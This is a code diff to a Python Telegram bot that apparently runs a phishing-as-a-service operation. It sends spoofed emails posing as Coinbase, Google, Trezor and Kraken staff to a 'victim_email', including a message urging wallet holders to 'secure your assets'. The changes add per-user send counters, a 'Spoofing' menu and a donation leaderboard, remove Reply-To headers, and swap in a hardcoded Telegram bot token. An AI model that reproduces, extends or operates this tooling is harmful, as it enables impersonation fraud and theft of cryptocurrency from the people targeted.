@@ -74,6 +74,8 @@ def load_email_counts():
             data = json.load(file)
             global_email_count = data.get("global_count", 0)
             user_email_counts = data.get("user_counts", {})
+            # Ensure user_email_counts has unique keys
+            user_email_counts = {str(k): v for k, v in user_email_counts.items()}
     else:
         global_email_count = 0
         user_email_counts = {}
@@ -105,6 +107,13 @@ def log_email_details(update: Update, command_type: str, victim_email: str, extr
 
     file_logger.info(log_message)
 
+def increment_global_email_count(user_id):
+    global global_email_count, user_email_counts
+    global_email_count += 1
+    user_id_str = str(user_id)
+    user_email_counts[user_id_str] = user_email_counts.get(user_id_str, 0) + 1
+    save_email_counts()
+
 async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     donate_message = (
         "BTC: bc1qj8f5r29ksq3uq62eu6ycr9qt9sfz9hjkcvz00m\n"
@@ -121,14 +130,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "Support: @un0h4na\n\n"
         "This project is funded by donations!\n"
         "If you want me to eat and keep the SMTPs fresh, feel free to do /donate\n\n"
+        "[Dono Leaderboard]\n\n"
+        "[1] Anonymous - 1$\n"
+        "[2]\n"
+        "[3]\n\n"
         "[Info]\n\n"
         f"• Mails sent: {global_email_count}\n"
         f"• Your mails sent: {user_email_counts.get(str(update.effective_user.id), 0)}\n"
     )
 
     keyboard = [
-        [KeyboardButton("Misc"), KeyboardButton("Coinbase")],
-        [KeyboardButton("Other"), KeyboardButton("/donate")]
+        [KeyboardButton("Misc")],
+        [KeyboardButton("Spoofing"), KeyboardButton("/donate")]
     ]
 
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
@@ -300,7 +313,8 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 smtp_details["username"],
                 subject,
                 msg,
-                victim_email
+                victim_email,
+                context.effective_user.id
             )
             await update.message.reply_text("Custom email sent successfully!")
         except Exception as e:
@@ -549,7 +563,7 @@ async def send_employee_coinbase_email(
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "Case Review" 
-    msg['Reply-To'] = 'help@coinbase.com'
+   # msg['Reply-To'] = 'support@coinbase.com'
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
     html_part = MIMEText(html_body, "html", "utf-8")
@@ -568,11 +582,15 @@ async def send_employee_coinbase_email(
             "Coinbase Case Review",
             msg,
             recipients,
+            context.effective_user.id
         )
         log_email_details(context, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
         return "Coinbase Employee Mail sent successfully!"
     except Exception as e:
         return f"Failed to send email due to an internal error: {e}"
+
+
+
 
 async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_email):
     """Send the Coinbase Wallet Email."""
@@ -593,7 +611,7 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
-    msg['Reply-To'] = 'help@coinbase.com'
+    #msg['Reply-To'] = 'support@coinbase.com'
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
     html_part = MIMEText(html_body, "html", "utf-8")
@@ -611,6 +629,7 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
             "Secure your assets to self-custody",
             msg,
             recipients,
+            context.effective_user.id
         )
         return "Coinbase Wallet Mail sent successfully!"
     except Exception as e:
@@ -635,7 +654,6 @@ async def send_secure_coinbase_email(
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "Secure Coinbase Token"
-    msg['Reply-To'] = 'help@coinbase.com'
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
     html_part = MIMEText(html_body, "html", "utf-8")
@@ -654,6 +672,7 @@ async def send_secure_coinbase_email(
             "Secure Coinbase Token",
             msg,
             recipients,
+            context.effective_user.id
         )
         log_email_details(context, "secure_coinbase", recipients, {"link": link}) 
         return "Coinbase Secure Link Mail sent successfully!"
@@ -700,7 +719,7 @@ async def send_employee_google_email(
             msg.attach(img)
 
         send_email_through_smtp(
-            "Google", smtp_details["username"], "Google Case Review", msg, recipients
+            "Google", smtp_details["username"], "Google Case Review", msg, recipients, context.effective_user.id
         )
         return "Google Employee Mail sent successfully!"
     except Exception as e:
@@ -762,6 +781,7 @@ async def send_employee_trezor_email(
             "Your case is under review",
             msg,
             recipients,
+            context.effective_user.id
         )
         log_email_details(context, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
         return "Trezor Employee Mail sent successfully!"
@@ -833,6 +853,7 @@ async def send_employee_kraken_email(
             "Your case is under review",
             msg,
             recipients,
+            context.effective_user.id
         )
         return "Kraken Employee Mail sent successfully!"
     except Exception as e:
@@ -869,7 +890,7 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "A manual review is pending"
-    msg['Reply-To'] = 'help@coinbase.com'
+    #    msg['Reply-To'] = 'support@coinbase.com'
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
     html_part = MIMEText(html_body, "html", "utf-8")
@@ -887,6 +908,7 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
             "A manual review is pending",
             msg,
             recipients,
+            context.effective_user.id
         )
         log_email_details(update, "coinbase_delay", recipients, {"link": link, "amount": amount, "token_symbol": token_symbol})
         return "Coinbase Delay Email sent successfully!"
@@ -909,7 +931,7 @@ broadcast_handler = ConversationHandler(
 
 
 
-def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
+def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients, user_id):
     try:
         recipient_list = (
             recipients.split(",") if isinstance(recipients, str) else recipients
@@ -923,6 +945,9 @@ def send_email_through_smtp(display_name, smtp_username, subject, msg, recipient
 
         logging.info(f"{display_name} email sent successfully to {recipients}")
 
+        # Increment the global and user email count
+        increment_global_email_count(user_id)
+
     except Exception as e:
         logging.error(f"Failed to send email: {str(e)}")
         raise e
@@ -931,7 +956,7 @@ def main():
     load_email_counts()
 
 
-    TOKEN = "8161193786:AAEw62XKG_beqNdVGGDBH4eEji6KLFLBHNU"
+    TOKEN = "7913920205:AAEEHW_QOaFQcH1zjwUXSru84iWNRTRSWsU"
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
@@ -1065,18 +1090,18 @@ def main():
 
     application.add_handler(custom_mail_handler)
     application.add_handler(CommandHandler("donate", donate))
-    application.add_handler(coinbase_delay_handler)
+    #application.add_handler(coinbase_delay_handler)
     application.add_handler(employee_trezor_handler)
     application.add_handler(employee_kraken_handler)
     application.add_handler(wallet_coinbase_handler)
-    application.add_handler(employee_coinbase_handler)
-    application.add_handler(secure_coinbase_handler)
+    #application.add_handler(employee_coinbase_handler)
+    #application.add_handler(secure_coinbase_handler)
     application.add_handler(employee_google_handler)
     application.add_handler(broadcast_handler)
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.Regex("Misc"), misc_menu))
-    application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
-    application.add_handler(MessageHandler(filters.Regex("Other"), other_menu))
+    #application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
+    application.add_handler(MessageHandler(filters.Regex("Spoofing"), other_menu))
     application.add_handler(MessageHandler(filters.Regex("Back to Main Menu"), back_to_main_menu))
 
     application.run_polling()
